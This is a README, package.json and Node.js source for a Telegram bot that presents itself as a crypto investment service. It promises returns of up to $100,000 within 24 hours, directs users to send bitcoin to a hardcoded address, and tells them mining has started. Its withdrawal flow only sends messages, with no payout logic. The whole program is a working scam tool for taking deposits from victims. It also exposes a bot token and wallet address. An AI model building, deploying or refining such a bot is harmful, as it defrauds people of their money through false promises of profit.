# Telegram-investment-bot
Telegram investment bot
{
  "name": "telegram-bot",
  "version": "1.0.0",
  "main": "index.js",
  "scripts": {
    "start": "node index.js"
  },
  "dependencies": {
    "node-telegram-bot-api": "^0.61.0"
  }
}
const TelegramBot = require("node-telegram-bot-api");

// 🔑 Credentials
const TOKEN = "8339251170:AAEFnfojnf8wsjPAM_IXRJZVFCaGbPnJce8"; // BotFather token
const ADMIN_ID = "7465595059"; // Your Telegram ID
const DEPOSIT_BTC = "14vwrqmDtus9EWXGCfL3bDZbrhf86X9SsU"; // BTC deposit address

// Investment plans
const plans = [
  { id: 1, min: 250, max: 999, potential: 20000 },
  { id: 2, min: 1000, max: 4999, potential: 50000 },
  { id: 3, min: 5000, max: 10000, potential: 100000 }
];

// Track users
const users = {};

const bot = new TelegramBot(TOKEN, { polling: true });

// 🟢 Start command
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  users[chatId] = { step: "plans" };

  let options = {
    reply_markup: {
      inline_keyboard: plans.map((p) => [
        {
          text: `Plan $${p.min} - $${p.max} (Return $${p.potential})`,
          callback_data: `plan_${p.id}`
        }
      ])
    }
  };

  bot.sendMessage(chatId, "📊 Choose your investment plan:", options);
});

// 🟢 Handle inline buttons
bot.on("callback_query", (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;
  const state = users[chatId];

  if (!state) return;

  if (data.startsWith("plan_")) {
    const planId = parseInt(data.split("_")[1]);
    const plan = plans.find((p) => p.id === planId);

    users[chatId] = { step: "deposit", selectedPlan: plan };

    bot.sendMessage(
      chatId,
      `💰 You selected Plan $${plan.min} - $${plan.max}\nEnter your deposit amount (within this range):`
    );
  }

  if (data === "copy_address") {
    bot.sendMessage(chatId, "📋 Address copied to clipboard (please copy manually).");
  }

  if (data === "sent_proof") {
    bot.sendMessage(chatId, "📩 Proof sent. Waiting for manager confirmation...");
  }

  // Admin approves deposit
  if (data.startsWith("approve_")) {
    const userId = data.split("_")[1];
    const userState = users[userId];

    if (userState && userState.depositAmount) {
      bot.sendMessage(
        userId,
        `✅ Manager confirmed your deposit of $${userState.depositAmount}.\nMining started! Your potential return is $${userState.selectedPlan.potential} in 24h.`
      );
    }
    bot.sendMessage(ADMIN_ID, `👍 Approved deposit for user ${userId}.`);
  }

  // Admin rejects deposit
  if (data.startsWith("reject_")) {
    const userId = data.split("_")[1];
    bot.sendMessage(userId, "❌ Your deposit was rejected. Please contact support.");
    bot.sendMessage(ADMIN_ID, `👎 Rejected deposit for user ${userId}.`);
  }

  // Admin approves withdrawal
  if (data.startsWith("w_approve_")) {
    const userId = data.split("_")[2];
    const userState = users[userId];

    if (userState && userState.withdraw) {
      bot.sendMessage(
        userId,
        `✅ Withdrawal of $${userState.withdraw.amount} to address ${userState.withdraw.address} has been processed.`
      );
    }
    bot.sendMessage(ADMIN_ID, `💸 Approved withdrawal for user ${userId}.`);
  }

  // Admin rejects withdrawal
  if (data.startsWith("w_reject_")) {
    const userId = data.split("_")[2];
    bot.sendMessage(userId, "❌ Your withdrawal was rejected. Please contact support.");
    bot.sendMessage(ADMIN_ID, `🚫 Rejected withdrawal for user ${userId}.`);
  }
});

// 🟢 Handle messages
bot.on("message", (msg) => {
  const chatId = msg.chat.id;
  const state = users[chatId];
  if (!state) return;

  // Deposit flow
  if (state.step === "deposit" && !state.depositAmount) {
    const amount = parseFloat(msg.text);

    if (isNaN(amount) || amount < state.selectedPlan.min || amount > state.selectedPlan.max) {
      bot.sendMessage(chatId, `❌ Invalid amount. Please enter between $${state.selectedPlan.min} - $${state.selectedPlan.max}.`);
      return;
    }

    state.depositAmount = amount;
    state.step = "waiting_confirmation";

    bot.sendMessage(
      chatId,
      `✅ Deposit amount set: $${amount}\n\nSend BTC to:\n\`${DEPOSIT_BTC}\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "📋 Copy Address", callback_data: "copy_address" }],
            [{ text: "✅ I Sent Proof", callback_data: "sent_proof" }]
          ]
        }
      }
    );

    // Notify admin
    bot.sendMessage(
      ADMIN_ID,
      `⚡ New Deposit Request\nUser: ${chatId}\nPlan: $${state.selectedPlan.min}-${state.selectedPlan.max}\nAmount: $${amount}\n\nApprove?`,
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "✅ Approve", callback_data: `approve_${chatId}` }],
            [{ text: "❌ Reject", callback_data: `reject_${chatId}` }]
          ]
        }
      }
    );
  }

  // Withdrawal flow
  if (msg.text === "/withdraw") {
    users[chatId].step = "withdraw_address";
    bot.sendMessage(chatId, "🏦 Enter your withdrawal wallet address:");
    return;
  }

  if (state.step === "withdraw_address") {
    state.withdraw = { address: msg.text };
    state.step = "withdraw_amount";
    bot.sendMessage(chatId, "💵 Enter amount to withdraw:");
    return;
  }

  if (state.step === "withdraw_amount") {
    const amount = parseFloat(msg.text);

    if (isNaN(amount) || amount <= 0) {
      bot.sendMessage(chatId, "❌ Invalid amount. Please enter a number.");
      return;
    }

    state.withdraw.amount = amount;
    state.step = "waiting_withdrawal";

    bot.sendMessage(chatId, `✅ Withdrawal request submitted for $${amount} to address ${state.withdraw.address}. Waiting for manager approval.`);

    // Notify admin
    bot.sendMessage(
      ADMIN_ID,
      `💸 New Withdrawal Request\nUser: ${chatId}\nAmount: $${amount}\nAddress: ${state.withdraw.address}\n\nApprove?`,
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "✅ Approve", callback_data: `w_approve_${chatId}` }],
            [{ text: "❌ Reject", callback_data: `w_reject_${chatId}` }]
          ]
        }
      }
    );
  }
});

console.log("🤖 Bot is running...");
